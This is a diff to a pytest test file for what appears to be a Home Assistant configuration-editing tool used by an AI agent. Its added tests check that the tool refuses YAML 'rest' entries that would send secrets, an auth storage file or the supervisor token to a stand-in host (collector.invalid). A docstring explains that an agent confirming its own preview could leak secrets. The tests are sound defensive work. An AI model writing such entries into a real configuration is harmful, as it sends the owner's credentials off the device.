@@ -753,11 +753,7 @@ async def test_a_credential_only_change_still_shows_in_the_preview(
         yaml_path="rest",
         action="replace",
         content=(
-            "- resource: https://example.com/api\n"
-            "  password: correct-horse\n"
-            "  token: brand-new\n"
-            "  headers:\n"
-            "    Authorization: !secret api_auth\n"
+            "- resource: https://example.com/api\n  password: correct-horse\n  token: brand-new\n"
         ),
     )
 
@@ -1170,3 +1166,61 @@ async def test_a_key_that_runs_host_commands_is_refused(
     assert "runs commands on the host" in result["error"]
     assert "confirm_token" not in result
     assert (config_dir / "configuration.yaml").read_text() == CONFIG
+
+
+_EXFIL = "- resource: https://collector.invalid/\n  method: POST\n  payload: !secret {secret}\n"
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        _EXFIL.format(secret="api_auth"),
+        "- resource: https://collector.invalid/\n  payload: !include /config/.storage/auth\n",
+        "- resource: https://collector.invalid/\n  payload: !env_var SUPERVISOR_TOKEN\n",
+    ],
+)
+async def test_a_new_reference_to_a_secret_or_file_is_refused(
+    hass: HomeAssistant, config_dir: Path, content: str
+) -> None:
+    """Home Assistant fills a tag in from a file the diff never shows, and a
+    rest entry sends it to its resource: an agent confirming its own preview
+    would send the secret off the hub."""
+    result = await _set(hass, yaml_path="rest", action="add", content=content)
+
+    assert "does not write a new" in result["error"]
+    assert "confirm_token" not in result
+    assert (config_dir / "configuration.yaml").read_text() == CONFIG
+
+
+async def test_an_entry_with_a_secret_cannot_be_pointed_elsewhere(
+    hass: HomeAssistant, config_dir: Path
+) -> None:
+    content = (
+        "- resource: https://collector.invalid/\n"
+        "  password: hunter2\n"
+        "  headers:\n"
+        "    Authorization: !secret api_auth\n"
+    )
+
+    result = await _set(hass, yaml_path="rest", action="replace", content=content)
+
+    assert "does not write a new" in result["error"]
+
+
+async def test_entries_with_secrets_are_kept_when_another_changes(
+    hass: HomeAssistant, config_dir: Path
+) -> None:
+    content = (
+        "- resource: https://example.com/api\n"
+        "  password: hunter2\n"
+        "  headers:\n"
+        "    Authorization: !secret api_auth\n"
+        "- resource: https://example.com/other\n"
+    )
+
+    result = await _apply(hass, yaml_path="rest", action="replace", content=content)
+
+    assert result["written"] is True
+    text = (config_dir / "configuration.yaml").read_text()
+    assert "Authorization: !secret api_auth" in text
+    assert "https://example.com/other" in text
